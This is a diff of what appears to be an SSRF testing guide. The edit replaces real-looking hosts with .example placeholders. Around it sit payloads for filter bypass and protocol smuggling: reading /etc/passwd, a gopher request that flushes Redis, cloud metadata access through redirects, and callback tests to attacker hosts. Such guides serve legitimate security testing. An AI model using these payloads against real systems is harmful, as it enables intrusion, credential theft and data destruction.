@@ -223,10 +223,10 @@ X-Cache headers revealing internal hostnames
 interactsh-client -v
 
 # Test parameter
-curl -s "https://target.com/api/preview?url=https://YOUR_ID.oast.pro"
+curl -s "https://target.example/api/preview?url=https://YOUR_ID.oast.pro"
 
 # With common headers that might unlock SSRF
-curl -s "https://target.com/api/fetch" \
+curl -s "https://target.example/api/fetch" \
   -H "Content-Type: application/json" \
   -d '{"url":"https://YOUR_ID.oast.pro"}'
 ```
@@ -318,7 +318,7 @@ grep -rE "(follow_redirects|allow_redirects|followRedirects)\s*=\s*[Tt]rue"
 ### ffuf Parameter Discovery
 ```bash
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -u "https://target.com/api/endpoint?FUZZ=https://YOUR.callback.com" \
+  -u "https://target.example/api/endpoint?FUZZ=https://YOUR.callback.com" \
   -fs 0 -mc all
 ```
 
@@ -365,19 +365,19 @@ http://0/                   (resolves to 0.0.0.0)
 # Subdomain pointing to internal IP
 http://localtest.me/         (resolves to 127.0.0.1)
 http://127.0.0.1.nip.io/
-http://customer.attacker.com/ (A record → 192.168.1.1)
+http://customer.attacker.example/ (A record → 192.168.1.1)
 
 # URL parser confusion
-http://evil.com@127.0.0.1/
-http://127.0.0.1#evil.com
-http://127.0.0.1%25@evil.com  (URL encoding)
-http://evil.com\.127.0.0.1/   (backslash)
+http://evil.example@127.0.0.1/
+http://127.0.0.1#evil.example
+http://127.0.0.1%25@evil.example  (URL encoding)
+http://evil.example\.127.0.0.1/   (backslash)
 
 # Protocol confusion
 file:///etc/passwd
 dict://127.0.0.1:6379/
 gopher://127.0.0.1:6379/_FLUSHALL  (Redis via gopher)
-sftp://attacker.com:11111/
+sftp://attacker.example:11111/
 ldap://127.0.0.1/
 
 # Redirect chain bypass
@@ -385,7 +385,7 @@ https://allowlisted-domain.com → HTTP 301 → http://169.254.169.254/
 
 # Case variation / URL encoding
 http://Localhost/
-http://127.0.0.1%2F@evil.com/
+http://127.0.0.1%2F@evil.example/
 ```
 
 ### App-layer input-encoding bypass (filter sees one thing, fetcher another)
@@ -413,7 +413,7 @@ Full-read SSRF via this path-confusion reaches cloud-credential endpoints the di
 ### Schema/Protocol Bypasses
 ```
 # When only http/https allowed but implementation is loose
-http://169.254.169.254:80@evil.com/
+http://169.254.169.254:80@evil.example/
 //169.254.169.254/
 ```
 
